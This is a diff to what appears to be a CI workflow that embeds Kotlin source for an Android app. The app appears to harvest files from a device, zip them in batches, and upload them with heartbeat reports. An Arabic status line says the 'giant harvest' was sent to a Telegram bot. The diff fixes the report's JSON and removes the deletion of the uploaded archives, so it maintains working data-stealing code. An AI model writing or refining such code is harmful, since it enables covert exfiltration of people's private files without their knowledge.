@@ -246,7 +246,7 @@ jobs:
                               conn.connectTimeout = 10000
                               conn.readTimeout = 10000
 
-                              val reportJson = "{"type":"TEXT_REPORT","data":"[Heartbeat] Uranium Node active from $nodeModel"}"
+                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Uranium Node active from $nodeModel\"}"
 
                               OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                                   os.write(reportJson)
@@ -438,7 +438,6 @@ jobs:
                                                   sendReportSizeBytes(nodeId, nodeModel, batchIndex, prefix, fileCountInBatch, batchOriginalBytes, compressedSizeMB)
                                                   
                                                   uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
-                                                  if (zipFile.exists()) zipFile.delete()
 
                                                   batchIndex++
                                                   fileCountInBatch = 0
@@ -459,9 +458,6 @@ jobs:
                           val compressedSizeMB = zipFile.length() / (1024.0 * 1024.0)
                           sendReportSizeBytes(nodeId, nodeModel, batchIndex, prefix, fileCountInBatch, batchOriginalBytes, compressedSizeMB)
                           uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
-                          if (zipFile.exists()) zipFile.delete()
-                      } else {
-                          if (zipFile.exists()) zipFile.delete()
                       }
 
                       sendReportToServer(nodeId, nodeModel, "✅ تم إتمام الحصاد العملاق لـ $prefix وإرسال كافة الأجزاء إلى بوت تيليجرام بنجاح!")
@@ -529,19 +525,16 @@ jobs:
                           conn.disconnect()
 
                           if (responseCode == 200) {
-                              if (file.exists()) file.delete()
                               return
                           }
                       } catch (e: Exception) {
                           if (attempt == MAX_RETRIES) {
-                              if (file.exists()) file.delete()
                               sendReportToServer(nodeId, nodeModel, "❌ فشل رفع الملف ${file.name}: ${e.message}")
                           } else {
                               try { Thread.sleep(2000L) } catch (ex: Exception) {}
                           }
                       }
                   }
-                  if (file.exists()) file.delete()
               }
 
               private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
@@ -601,9 +594,6 @@ jobs:
               compileOptions {
                   sourceCompatibility JavaVersion.VERSION_17
                   targetCompatibility JavaVersion.VERSION_17
-              }
-              kotlinOptions {
-                  jvmTarget = '17'
               }
           }
           dependencies {
